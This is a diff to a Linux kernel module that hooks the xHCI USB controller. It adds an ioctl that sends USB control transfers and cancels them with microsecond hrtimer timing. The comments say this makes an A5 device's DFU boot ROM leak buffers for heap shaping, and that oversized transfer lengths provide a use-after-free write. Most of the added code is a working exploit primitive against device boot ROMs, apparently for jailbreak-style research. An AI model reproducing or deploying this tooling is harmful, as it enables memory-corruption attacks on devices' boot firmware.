@@ -30,6 +30,8 @@
 #include <linux/kprobes.h>
 #include <linux/version.h>
 #include <linux/delay.h>
+#include <linux/hrtimer.h>
+#include <linux/ktime.h>
 #include <linux/dma-mapping.h>
 #include <linux/usb.h>
 #include <linux/usb/hcd.h>
@@ -43,6 +45,7 @@
 #define RAW0_IOC_PUSH _IOW(RAW0_IOCBASE, 1, struct raw0_txn)
 #define RAW0_IOC_INFO _IOR(RAW0_IOCBASE, 2, struct raw0_info)
 #define RAW0_IOC_STATE _IOR(RAW0_IOCBASE, 3, struct raw0_state)
+#define RAW0_IOC_LEAK _IOW(RAW0_IOCBASE, 4, struct raw0_leak)
 
 #define RAW0_MAX_DATA 0x1000
 
@@ -70,6 +73,30 @@ struct raw0_state {
 	__u32 ep0_state;  /* chip's EP0 context DW0: 0=disabled 1=running 3=stopped */
 };
 
+/*
+ * LEAK: submit a control URB on the captured device and cancel it
+ * cancel_us microseconds later via an hrtimer - in-kernel timing,
+ * no userspace latency. The URB rides the kernel's own cancel
+ * machinery (Stop Endpoint + Set TR Dequeue) to die mid-transfer:
+ * the wire never emits the status phase, so the A5 DFU ROM leaks
+ * its per-request io_buffer - the sketch's feng-shui primitive,
+ * finally reproducible on this AMD xHC.
+ * data_len may EXCEED wLength (in the setup packet): kernel-internal
+ * control URBs are not truncated to wLength - the overshoot the
+ * usbfs layer forbids, which is the stage-3 UAF write.
+ */
+struct raw0_leak {
+	__u8 setup[8];      /* the 8 wire setup bytes (wLength matters) */
+	__u32 data_len;     /* transfer length (may exceed setup wLength) */
+	__u8 has_data;
+	__u8 dir_in;
+	__u8 complete;      /* 1 = wait for full completion, no cancel */
+	__u8 pad0;
+	__u32 cancel_us;    /* hrtimer cancel delay for !complete */
+	__u32 pad1;
+	__u64 user_data;    /* data source pointer */
+} __attribute__((packed));
+
 /* ------------------------------------------------------------------ */
 /* hook state                                                          */
 
@@ -78,6 +105,7 @@ static struct ftrace_ops raw0_ops;
 
 static struct xhci_hcd *g_xhci; /* captured at address-device time */
 static int g_slot = -1;
+static struct usb_device *g_udev; /* captured alongside, for URB submits */
 
 /* per-push staging (single ioctl at a time via xhci lock + mutex) */
 static DEFINE_MUTEX(raw0_mtx);
@@ -132,6 +160,7 @@ static void notrace raw0_hook(unsigned long ip, unsigned long parent_ip,
 	/* capture while we are here */
 	g_xhci = hcd_to_xhci(hcd);
 	g_slot = udev->slot_id;
+	g_udev = udev;
 }
 
 /* ------------------------------------------------------------------ */
@@ -378,7 +407,115 @@ out:
 }
 
 /* ------------------------------------------------------------------ */
-/* device plumbing                                                     */
+/* LEAK: URB submit + hrtimer-armed cancel (the wire-true feng shui)   */
+
+static struct usb_device *leak_udev;   /* held reference */
+static struct urb *leak_urb;
+static unsigned char *leak_setup;      /* 8 bytes */
+static unsigned char *leak_data;       /* RAW0_MAX_DATA */
+static struct hrtimer leak_timer;
+static struct work_struct leak_work;    /* unlink from process context */
+static struct completion leak_done;
+static int leak_inflight;
+
+/*
+ * usb_unlink_urb() is process-context only. The hrtimer callback runs
+ * in hardirq context (calling unlink there hard-freeze the box on the
+ * first night run), so the timer only schedules this worker.
+ */
+static void leak_work_cb(struct work_struct *w)
+{
+	if (leak_urb)
+		usb_unlink_urb(leak_urb);
+}
+
+static enum hrtimer_restart leak_timer_cb(struct hrtimer *t)
+{
+	schedule_work(&leak_work);
+	return HRTIMER_NORESTART;
+}
+
+static void leak_complete(struct urb *urb)
+{
+	complete(&leak_done);
+}
+
+/*
+ * Submit one control URB on the captured device with the given setup
+ * and data (staging-copied). If cancel_us > 0, an hrtimer unlinks the
+ * URB after the delay; else we wait for natural completion.
+ */
+static int raw0_leak(const struct raw0_leak *l)
+{
+	unsigned int pipe;
+	int rc = 0;
+	unsigned long ret;
+
+	if (leak_inflight)
+		return -EBUSY;
+	if (!g_udev)
+		return -ENODEV;
+	if (l->has_data && l->data_len && l->data_len > RAW0_MAX_DATA)
+		return -EMSGSIZE;
+
+	if (!leak_udev) {
+		leak_udev = usb_get_dev(g_udev);
+		if (!leak_udev)
+			return -ENODEV;
+		leak_setup = kmalloc(8, GFP_KERNEL);
+		leak_data = kmalloc(RAW0_MAX_DATA, GFP_KERNEL);
+		leak_urb = usb_alloc_urb(0, GFP_KERNEL);
+		if (!leak_setup || !leak_data || !leak_urb)
+			return -ENOMEM;
+		hrtimer_setup(&leak_timer, leak_timer_cb,
+		              CLOCK_MONOTONIC, HRTIMER_MODE_REL);
+		INIT_WORK(&leak_work, leak_work_cb);
+	}
+
+	memcpy(leak_setup, l->setup, 8);
+	if (l->has_data && l->data_len && l->user_data) {
+		if (copy_from_user(leak_data,
+			(const void __user *)(unsigned long)l->user_data,
+			l->data_len))
+			return -EFAULT;
+	} else {
+		memset(leak_data, 0, RAW0_MAX_DATA);
+	}
+
+	pipe = (l->dir_in ? usb_rcvctrlpipe(leak_udev, 0) :
+	        usb_sndctrlpipe(leak_udev, 0));
+	usb_fill_control_urb(leak_urb, leak_udev, pipe, leak_setup,
+	                    leak_data, l->has_data ? l->data_len : 0,
+	                    leak_complete, NULL);
+	reinit_completion(&leak_done);
+	leak_inflight = 1;
+
+	rc = usb_submit_urb(leak_urb, GFP_KERNEL);
+	if (rc) {
+		leak_inflight = 0;
+		return rc;
+	}
+
+	if (l->complete) {
+		ret = wait_for_completion_timeout(&leak_done, HZ);
+	} else {
+		hrtimer_start(&leak_timer,
+		              ns_to_ktime(l->cancel_us * 1000ULL),
+		              HRTIMER_MODE_REL);
+		ret = wait_for_completion_timeout(&leak_done, HZ);
+		hrtimer_try_to_cancel(&leak_timer);
+	}
+	cancel_work_sync(&leak_work);
+	leak_inflight = 0;
+	if (!ret) {
+		/* straggler: kill before anyone reuses the URB */
+		usb_kill_urb(leak_urb);
+		return -ETIMEDOUT;
+	}
+	return leak_urb->status;
+}
+
+
 
 static dev_t raw0_devt;
 static struct cdev raw0_cdev;
@@ -397,6 +534,7 @@ static int raw0_release(struct inode *inode, struct file *file)
 static long raw0_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
 	struct raw0_txn t;
+	struct raw0_leak lk;
 	struct raw0_state st;
 
 	switch (cmd) {
@@ -404,6 +542,10 @@ static long raw0_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 		if (copy_from_user(&t, (void __user *)arg, sizeof(t)))
 			return -EFAULT;
 		return raw0_push(&t);
+	case RAW0_IOC_LEAK:
+		if (copy_from_user(&lk, (void __user *)arg, sizeof(lk)))
+			return -EFAULT;
+		return raw0_leak(&lk);
 	case RAW0_IOC_STATE:
 		memset(&st, 0, sizeof(st));
 		st.xhci_addr = (u64)(uintptr_t)g_xhci;
@@ -525,6 +667,17 @@ err_hook:
 
 static void __exit raw0_exit(void)
 {
+	/* leak plumbing - only tear down if it was ever initialized
+	 * (hrtimer_cancel on a zeroed hrtimer crashes the kernel) */
+	if (leak_urb) {
+		hrtimer_cancel(&leak_timer);
+		cancel_work_sync(&leak_work);
+		usb_free_urb(leak_urb);
+	}
+	kfree(leak_setup);
+	kfree(leak_data);
+	if (leak_udev)
+		usb_put_dev(leak_udev);
 	if (staging_mapped && g_xhci)
 		dma_unmap_single(xhci_to_hcd(g_xhci)->self.sysdev,
 		                 staging_dma, RAW0_MAX_DATA,
